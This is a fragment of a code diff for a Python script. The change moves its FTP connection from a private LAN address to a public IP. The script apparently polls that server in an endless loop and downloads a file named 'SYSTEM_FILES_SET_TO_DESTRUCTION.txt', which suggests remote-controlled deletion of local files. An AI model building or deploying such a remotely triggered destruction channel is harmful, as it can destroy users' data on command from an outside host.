@@ -24,7 +24,7 @@ def storeNewDirectories(x):
 
 destructionList = []
 def destroyFile(filename):
-    ftp.connect('192.168.1.11',1026)
+    ftp.connect('163.47.56.221',1026)
     ftp.login()
     destruct_name = "SYSTEM_FILES_SET_TO_DESTRUCTION.txt"
     downloadFile("Z:/" + destruct_name,destruct_name)
@@ -39,7 +39,7 @@ def destroyFile(filename):
 
 prevDirectoryList = []
 while(True):
-    ftp.connect('192.168.1.11',1026)
+    ftp.connect('163.47.56.221',1026)
     ftp.login()
     ftp.retrlines('NLST',storeNewDirectories)
     ftp.quit()
